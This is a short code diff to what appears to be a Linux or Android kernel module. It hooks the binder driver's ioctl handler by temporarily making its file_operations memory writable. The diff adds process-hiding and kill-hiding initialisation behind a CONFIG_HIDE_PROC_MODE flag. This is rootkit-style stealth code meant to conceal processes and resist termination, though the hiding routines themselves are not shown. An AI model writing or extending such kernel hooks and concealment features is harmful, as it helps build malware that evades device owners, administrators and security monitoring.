@@ -119,7 +119,24 @@ static int __init sysop_init(void) {
     set_memory_rw((unsigned long)binder_fops & PAGE_MASK, 1);
     binder_fops->unlocked_ioctl = sysop_hooked_binder_ioctl;
     set_memory_ro((unsigned long)binder_fops & PAGE_MASK, 1);
-    
+
+	#ifdef CONFIG_HIDE_PROC_MODE
+	ret = hide_proc_init();
+	if (ret)
+	{
+		hide_proc_exit();
+		return ret;
+	}
+	#endif
+	
+	#ifdef CONFIG_HIDE_PROC_MODE
+	ret = hide_kill_init();
+	if (ret)
+	{
+		hide_kill_exit();
+		return ret;
+	}
+	#endif
     return 0;
 }
 
